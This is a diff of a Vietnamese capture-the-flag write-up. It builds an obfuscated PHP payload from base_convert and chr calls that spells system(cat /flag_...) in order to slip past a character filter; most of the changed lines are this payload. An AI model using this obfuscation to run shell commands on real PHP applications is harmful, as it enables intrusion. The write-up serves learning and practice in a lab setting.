@@ -87,7 +87,7 @@ Giờ thì mình mở ra xem hoyyyyy
 
 ### system(cat /flag_a2647e5eb8e9e767fe298aa012a49b50)
 
->system():					                   base_convert(1751504350,10,36)()
+>system():					                  base_convert(1751504350,10,36)()
 
 >cat:						                      base_convert(15941,10,36)
 
@@ -99,20 +99,14 @@ Giờ thì mình mở ra xem hoyyyyy
 
 >_:				                         		.base_convert(16191,10,36)(95)
 
->a2647e5eb8e9e767fe298aa012a49b50):		.base_convert(788365066082,10,36)
-
->						                         	.base_convert(880282369231,10,36)
-
->						                         	.base_convert(1206073849608,10,36)
-
->					                        		.base_convert(83329543332,10,36)
+>a2647e5eb8e9e767fe298aa012a49b50):		.base_convert(788365066082,10,36).base_convert(880282369231,10,36).base_convert(1206073849608,10,36).base_convert(83329543332,10,36)
 
 
 Đoạn nào chữ thôi thì mình chỉ cnầ dùng **base_convert** còn đoạn nào có ký tự đặc biệt thì mình kết hợp với **chr** (16191 base36) nữa nhé!
 Ở chuỗi chữ và số dài loằng ngoằng kia ban đầu mình chỉ dùng 1 lần **base_convert** nhưng mà nó bị tràn số ra kết quả hong chính xác nên mình chia thành 4 đoạn.
 Giờ chỉ cần ghép lại tất cả để có payload chính xác:
 
->>**PAYLOAD: base_convert(1751504350,10,36)(base_convert(15941,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47).base_convert(727432,10,36).base_convert(16191,10,36)(95).base_convert(788365066082,10,36).base_convert(880282369231,10,36).base_convert(1206073849608,10,36).base_convert(83329543332,10,36)) **
+>**PAYLOAD: base_convert(1751504350,10,36)(base_convert(15941,10,36).base_convert(16191,10,36)(32).base_convert(16191,10,36)(47).base_convert(727432,10,36).base_convert(16191,10,36)(95).base_convert(788365066082,10,36).base_convert(880282369231,10,36).base_convert(1206073849608,10,36).base_convert(83329543332,10,36)) **
 
 Hơi dài nhưng chỉ 405chars vẫn thỏa < 1024 của đề bài. Cuối cùng nhận được kết quả:
 
